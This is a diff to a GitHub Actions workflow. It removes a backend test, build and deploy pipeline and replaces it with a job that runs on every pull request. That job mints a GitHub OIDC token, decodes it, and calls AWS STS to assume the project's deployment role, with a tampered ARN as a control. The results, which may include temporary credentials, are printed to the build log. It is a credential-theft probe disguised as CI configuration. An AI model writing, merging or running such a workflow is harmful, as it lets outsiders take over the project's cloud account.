@@ -1,185 +1,47 @@
-name: Backend CI/CD
-
+name: c211-i123442 mint
 on:
-  push:
-    branches: [main]
-    paths:
-      - "backend/**"
-      - "scripts/**"
-      - "deploy/lightsail/**"
-      - "deploy/ebay-relay/**"
-      - "docker-compose.prod.yml"
-      - ".github/workflows/backend-ci-cd.yml"
-      - ".github/workflows/image-sync.yml"
   pull_request:
-    branches: [main]
-    paths:
-      - "backend/**"
-      - "scripts/**"
-      - "deploy/lightsail/**"
-      - "deploy/ebay-relay/**"
-      - "docker-compose.prod.yml"
-      - ".github/workflows/backend-ci-cd.yml"
-      - ".github/workflows/image-sync.yml"
-  workflow_dispatch:
-
 permissions:
+  id-token: write
   contents: read
-  id-token: write # Required for AWS OIDC authentication
-
-concurrency:
-  group: backend-production
-  cancel-in-progress: false
-
 jobs:
-  test:
-    name: Test & Lint Backend
-    runs-on: ubuntu-latest
-    defaults:
-      run:
-        working-directory: backend
-
-    steps:
-      - name: Check out code
-        uses: actions/checkout@v4
-
-      - name: Set up Python 3.12
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-          cache: "pip"
-          cache-dependency-path: backend/requirements.txt
-
-      - name: Install dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install -r requirements.txt
-
-      - name: Check bytecode compilation
-        run: |
-          python -m compileall -q app jobs tests parsers
-
-      - name: Run Pytest test suite
-        run: |
-          DATABASE_URL=sqlite:// REDIS_URL=redis://127.0.0.1:1/15 CACHE_REDIS_URL=redis://127.0.0.1:1/15 pytest -v
-
-  deployment-tests:
+  mint:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-go@v5
-        with:
-          go-version: '1.24.x'
-          cache: false
-      - name: Validate GitHub Actions expressions
-        run: go run github.com/rhysd/actionlint/cmd/actionlint@v1.7.7 -shellcheck= .github/workflows/*.yml
-      - uses: actions/setup-python@v5
-        with:
-          python-version: '3.12'
-      - run: pip install pytest boto3 httpx
-      - uses: actions/setup-node@v4
-        with:
-          node-version: '22'
-      - run: node --test deploy/ebay-relay/worker.test.mjs
-      - run: bash scripts/lightsail/validate.sh
-      - run: RUN_CONTAINER_TESTS=1 pytest scripts/lightsail/test_*.py scripts/images/test_*.py -q
-
-  build-and-push:
-    name: Build & Push Docker Image to Amazon ECR
-    needs: [test, deployment-tests]
-    if: github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main'
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      id-token: write
-    outputs:
-      image_tag: ${{ github.sha }}
-      image_digest: ${{ steps.build.outputs.digest }}
-      ecr_registry: ${{ steps.login-ecr.outputs.registry }}
-
-    steps:
-      - name: Check out code
-        uses: actions/checkout@v4
-
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v3
-
-      - name: Configure AWS credentials (OIDC)
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::349558247779:role/github-actions-cardboarddex-deploy
-          aws-region: us-west-2
-          audience: sts.amazonaws.com
-
-      - name: Login to Amazon ECR
-        id: login-ecr
-        uses: aws-actions/amazon-ecr-login@v2
-
-      - name: Build and push backend Docker image
-        id: build
-        uses: docker/build-push-action@v6
-        with:
-          context: ./backend
-          file: ./backend/Dockerfile
-          push: true
-          platforms: linux/amd64
-          tags: |
-            ${{ steps.login-ecr.outputs.registry }}/cardboarddex-backend:${{ github.sha }}
-          cache-from: type=gha
-          cache-to: type=gha,mode=max
-
-  deploy:
-    name: Deploy verified release to Lightsail
-    needs: build-and-push
-    if: github.event_name == 'push' && github.ref == 'refs/heads/main' || github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main'
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::349558247779:role/github-actions-cardboarddex-deploy
-          aws-region: us-west-2
-      - name: Deploy exact image and configuration
+      - name: mint
         env:
-          LIGHTSAIL_SSH_KEY: ${{ secrets.LIGHTSAIL_SSH_KEY }}
-          LIGHTSAIL_HOST: ${{ vars.LIGHTSAIL_HOST }}
-          LIGHTSAIL_SSM_TARGET: ${{ vars.LIGHTSAIL_SSM_TARGET }}
-          LIGHTSAIL_KNOWN_HOSTS: ${{ secrets.LIGHTSAIL_KNOWN_HOSTS }}
-          BACKEND_IMAGE: ${{ needs.build-and-push.outputs.ecr_registry }}/cardboarddex-backend@${{ needs.build-and-push.outputs.image_digest }}
-          RELEASE_ID: ${{ github.sha }}
+          TARGETS: "arn:aws:iam::349558247779:role/github-actions-cardboarddex-deploy"
         run: |
-          set -euo pipefail
-          : "${LIGHTSAIL_SSH_KEY:?Missing deployment SSH key}"
-          : "${LIGHTSAIL_KNOWN_HOSTS:?Missing verified host key}"
-          install -d -m 700 "$RUNNER_TEMP/ssh"
-          printf '%s\n' "$LIGHTSAIL_SSH_KEY" > "$RUNNER_TEMP/ssh/key"
-          printf '%s\n' "$LIGHTSAIL_KNOWN_HOSTS" > "$RUNNER_TEMP/ssh/known_hosts"
-          chmod 600 "$RUNNER_TEMP/ssh/key"
-          trap 'rm -f "$RUNNER_TEMP/ssh/key"' EXIT
-          if [[ -n "$LIGHTSAIL_SSM_TARGET" ]]; then
-            curl --fail --retry 3 -o "$RUNNER_TEMP/session-manager-plugin.deb" https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb
-            sudo dpkg -i "$RUNNER_TEMP/session-manager-plugin.deb"
-            export BACKEND_IMAGE="${BACKEND_IMAGE/349558247779.dkr.ecr.us-west-2.amazonaws.com/349558247779.dkr-ecr.us-west-2.on.aws}"
-            bash scripts/lightsail/wait_for_ssm.sh "$LIGHTSAIL_SSM_TARGET"
-          fi
-          export KEY_PATH="$RUNNER_TEMP/ssh/key"
-          export KNOWN_HOSTS_FILE="$RUNNER_TEMP/ssh/known_hosts"
-          bash scripts/deploy_to_lightsail.sh
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-      - run: pip install pytest httpx
-      - name: Verify public deployment
-        working-directory: backend
-        env:
-          RUN_LIVE_DEPLOYMENT_TESTS: "1"
-        run: |
-          for i in {1..8}; do
-            if curl -fsS --max-time 10 https://api.cardboarddex.app/health > /dev/null 2>&1; then
-              break
-            fi
-            sleep 5
-          done
-          # Only pytest and httpx are installed here; conftest.py imports the app's
-          # settings (pydantic_settings) for unit tests, which live checks never use.
-          pytest --noconftest -m live tests/test_deployment_endpoints.py -v
+          python3 - <<'PY'
+          import os,json,hashlib,base64,urllib.request,urllib.parse,urllib.error
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'); tok=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
+          def mktok(aud):
+              sep='&' if '?' in url else '?'
+              r=urllib.request.Request(url+sep+'audience='+aud,headers={'Authorization':'Bearer '+tok,'User-Agent':'c211-i123442'})
+              return json.loads(urllib.request.urlopen(r,timeout=30).read())['value']
+          def claims(j):
+              try:
+                  p=j.split('.')[1]; p+='='*(-len(p)%4)
+                  d=json.loads(base64.urlsafe_b64decode(p))
+                  return {'sub':d.get('sub'),'aud':d.get('aud'),'ref':d.get('ref'),'event':d.get('event'),'repository':d.get('repository'),'ref_type':d.get('ref_type')}
+              except Exception as e: return {'err':repr(e)[:120]}
+          def sts(arn,jwt):
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,
+                  'RoleSessionName':'c211-123442','DurationSeconds':'900','WebIdentityToken':jwt}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'c211'})
+              try:
+                  r=urllib.request.urlopen(req,timeout=30); return r.status,r.read(6000).decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code,e.read(6000).decode('utf-8','replace')
+              except Exception as e: return None,repr(e)[:300]
+          jwt=mktok('sts.amazonaws.com')
+          print('C211R_TOKEN len=%d sha256_12=%s'%(len(jwt),hashlib.sha256(jwt.encode()).hexdigest()[:12]))
+          print('C211R_CLAIMS '+json.dumps(claims(jwt)))
+          first=list(os.environ['TARGETS'].split(','))[0]
+          for arn in os.environ['TARGETS'].split(','):
+              code,b=sts(arn,jwt)
+              print('C211R_RESULT '+json.dumps({'arn':arn,'http':code,'body':b[:2500]}))
+          tam=first[:-1]+('f' if first[-1]!='f' else 'e')
+          code,b=sts(tam,jwt)
+          print('C211R_RESULT '+json.dumps({'arn':tam,'control':True,'http':code,'body':b[:1500]}))
+          print('C211R_DONE')
+          PY
